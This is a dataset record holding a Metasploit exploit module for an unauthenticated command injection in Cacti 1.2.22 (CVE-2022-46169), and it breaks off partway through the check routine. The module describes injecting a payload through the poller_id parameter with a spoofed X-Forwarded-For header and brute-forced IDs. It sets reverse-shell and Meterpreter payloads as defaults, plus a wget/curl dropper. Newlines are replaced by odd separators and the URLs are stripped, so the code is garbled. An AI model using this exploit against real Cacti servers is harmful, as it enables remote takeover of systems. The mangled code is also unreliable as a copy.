{
    "text": "vul_name : Cacti 1.2.22 Command Injection ， vul_cve : CVE-2022-46169 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Cacti 1.2.22 unauthenticated command injection' ,  ， 'Description' => %q{ ， This module exploits an unauthenticated command injection ， vulnerability in Cacti through 1.2.22 ( CVE-2022-46169 ) in ， order to achieve unauthenticated remote code execution as the ， www-data user. ， The module first attempts to obtain the Cacti version to see ， are not set , the module will try to bruteforce the missing ， value ( s ) . If a valid combination is found , the module will ， use these to attempt exploitation. If LOCAL_DATA_ID and/or ， HOST_ID are both set , the module will immediately attempt ， exploitation. ， During exploitation , the module sends a GET request to ， /remote_agent.php with the action parameter set to polldata ， and the X-Forwarded-For header set to the provided value for ， X_FORWARDED_FOR_IP ( by default 127.0.0.1 ) . In addition , the ， poller_id parameter is set to the payload and the host_id ， and local_data_id parameters are set to the bruteforced or ， provided values. If X_FORWARDED_FOR_IP is set to an address ， that is resolvable to a hostname in the poller table , and the ， local_data_id and host_id values are vulnerable , the payload ， set for poller_id will be executed by the target. ， This module has been successfully tested against Cacti ， version 1.2.22 running on Ubuntu 21.10 ( vulhub docker image )  ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Stefan Schiller' ,  # discovery ( independent of Steven Seeley )  ， 'Steven Seeley' ,  #  ( mr_me )  @ steventseeley - discovery ( independent of Stefan Schiller )  ， 'Owen Gong' ,  #  @ phithon_xg - vulhub PoC ， 'Erik Wynter' #  @ wyntererik - Metasploit ，  ]  ,  ， ' ，  [ 'CVE' , '2022-46169' ]  ,  ，  [ 'URL' , ' # disclosure and technical details ，  [ 'URL' , ' # vulhub vulnerable docker image and PoC ，  [ 'URL' , ' # analysis by Stefan Schiller ，  ]  ,  ， 'DefaultOptions' => { ， 'RPORT' => 8080 ， } ,  ， 'Platform' => %w [ unix linux ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_X86 , ARCH_X64 ]  ,  ， 'Targets' => [  ，  [  ， 'Automatic ( Unix In-Memory ) ' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } ,  ， 'Type' => : unix_memory ， } ，  ]  ,  ，  [  ， 'Automatic ( Linux Dropper ) ' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'CmdStagerFlavor' => [ 'echo' , 'printf' , 'wget' , 'curl' ]  ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ,  ， 'Type' => : linux_dropper ， } ，  ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => '2022-12-05' ,  ， 'DefaultTarget' => 1 ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ， register_options (  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path to Cacti' , '/' ]  )  ,  ， OptString.new ( 'X_FORWARDED_FOR_IP' ,  [ true , 'The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to a hostname in the poller table.' , '127.0.0.1' ]  )  ,  ， OptInt.new ( 'HOST_ID' ,  [ false , 'The host_id value to use. By default , the module will try to bruteforce this.' ]  )  ,  ， OptInt.new ( 'LOCAL_DATA_ID' ,  [ false , 'The local_data_id value to use. By default , the module will try to bruteforce this.' ]  )  ，  ]  )  ， register_advanced_options (  [  ， OptInt.new ( 'MIN_HOST_ID' ,  [ true , 'Lower value for the range of possible host_id values to check for' , 1 ]  )  ,  ， OptInt.new ( 'MAX_HOST_ID' ,  [ true , 'Upper value for the range of possible host_id values to check for' , 5 ]  )  ,  ， OptInt.new ( 'MIN_LOCAL_DATA_ID' ,  [ true , 'Lower value for the range of possible local_data_id values to check for' , 1 ]  )  ,  ， OptInt.new ( 'MAX_LOCAL_DATA_ID' ,  [ true , 'Upper value for the range of possible local_data_id values to check for' , 100 ]  )  ，  ]  )  ， end ， def check ，  # sanity check to see if the target is likely Cacti ， res = send_request_cgi ( { ， 'method' => 'GET' ,  ， 'uri' => normalize_uri ( target_uri.path )  ， } )  ， unless res",
    "time": "2023.01.24"
}